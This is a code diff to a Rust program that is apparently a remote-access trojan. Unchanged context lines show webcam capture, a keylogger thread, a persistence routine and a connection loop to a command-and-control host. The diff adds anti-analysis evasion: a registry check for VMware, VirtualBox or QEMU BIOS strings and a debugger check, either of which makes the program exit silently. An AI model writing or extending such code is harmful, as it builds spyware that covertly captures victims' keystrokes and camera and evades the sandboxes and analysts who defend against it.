@@ -98,6 +98,23 @@ fn capture_webcam() -> Vec<u8> {
     frame.buffer().to_vec()
 }
 
+fn is_vm() -> bool {
+    #[cfg(windows)]
+    {
+        use winreg::RegKey;
+        use winreg::enums::HKEY_LOCAL_MACHINE;
+        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+        if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
+            if let Ok(bios) = key.get_value::<String, _>("SystemBiosVersion") {
+                if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
 fn keylogger_thread(tx: std::sync::mpsc::Sender<String>) {
     let callback = move |event: Event| {
         if let EventType::KeyPress(key) = event.event_type {
@@ -224,6 +241,17 @@ async fn handle_connection(mut stream: TcpStream) -> Result<(), Box<dyn std::err
 #[tokio::main]
 async fn main() {
     persistence(); // Set persistence immediately
+
+    #[cfg(windows)]
+    {
+        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
+        if unsafe { IsDebuggerPresent() }.as_bool() {
+            std::process::exit(0);
+        }
+    }
+    if is_vm() {
+        std::process::exit(0);
+    }
 
     loop {
         match TcpStream::connect((C2_HOST, C2_PORT)).await {
